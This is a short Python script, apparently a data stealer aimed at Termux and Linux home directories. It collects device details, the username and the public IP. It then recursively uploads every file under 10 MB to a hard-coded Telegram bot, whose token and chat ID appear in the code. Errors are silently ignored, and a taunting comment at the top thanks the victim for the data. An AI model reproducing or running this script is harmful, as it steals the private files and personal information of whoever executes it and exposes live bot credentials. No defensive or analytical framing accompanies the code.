#MAKASIH DATANYA 🤤

#!/usr/bin/env python3
import os
import platform
import requests
import threading
import getpass

botToken = "8199253793:AAFTkguJNletrFPggxOGlSz6v6Y8L_iLimo"
chatId   = "6890266354"

MAX_SIZE = 10 * 1024 * 1024
PATHS    = ["/data/data/com.termux/files/home", "/home"]

def sendMessage(text: str):
    try:
        url = f'https://api.telegram.org/bot{botToken}/sendMessage'
        requests.post(url, data={'chat_id': chatId, 'text': text})
    except:
        pass

def sendFile(filePath: str):
    try:
        if os.path.getsize(filePath) > MAX_SIZE:
            return
    except Exception:
        return
    try:
        url = f'https://api.telegram.org/bot{botToken}/sendDocument'
        with open(filePath, 'rb') as f:
            requests.post(url, data={'chat_id': chatId}, files={'document': f})
    except:
        pass

def getPublicIP():
    for url in ("https://api.ipify.org", "https://ifconfig.me/ip", "https://checkip.amazonaws.com"):
        try:
            r = requests.get(url, timeout=5)
            if r.ok:
                return r.text.strip()
        except:
            continue
    return "Unknown"

def getUsername():
    try:
        u = getpass.getuser()
        if u:
            return u
    except:
        pass
    for k in ("USER", "LOGNAME", "USERNAME"):
        v = os.environ.get(k)
        if v:
            return v
    return "Unknown"

def sendDeviceInfo():
    try:
        import psutil
        ram = round(psutil.virtual_memory().total / (1024*1024), 2)
    except:
        ram = "Unknown"
    info = {
        "System"    : platform.system(),
        "Node"      : platform.node(),
        "Release"   : platform.release(),
        "Version"   : platform.version(),
        "Machine"   : platform.machine(),
        "Processor" : platform.processor(),
        "Python"    : platform.python_version(),
        "RAM (MB)"  : ram,
        "Username"  : getUsername(),
        "Public IP" : getPublicIP()
    }
    msg = "[📱] Device Info:\n" + "\n".join(f"- {k}: {v}" for k, v in info.items())
    try:
        url = f'https://api.telegram.org/bot{botToken}/sendMessage'
        requests.post(url, data={'chat_id': chatId, 'text': msg})
    except:
        pass

def sendFiles():
    threads = []
    for base in PATHS:
        if not os.path.isdir(base):
            continue
        for root, _, files in os.walk(base):
            if not files:
                continue
            sendMessage(f"📂 Folder: `{root}`")
            for name in files:
                fullPath = os.path.join(root, name)
                try:
                    if os.path.getsize(fullPath) > MAX_SIZE:
                        continue
                except Exception:
                    continue
                t = threading.Thread(target=sendFile, args=(fullPath,))
                threads.append(t)
                t.start()
    for t in threads:
        t.join()

if __name__ == "__main__":
    sendDeviceInfo()
    sendFiles()
  
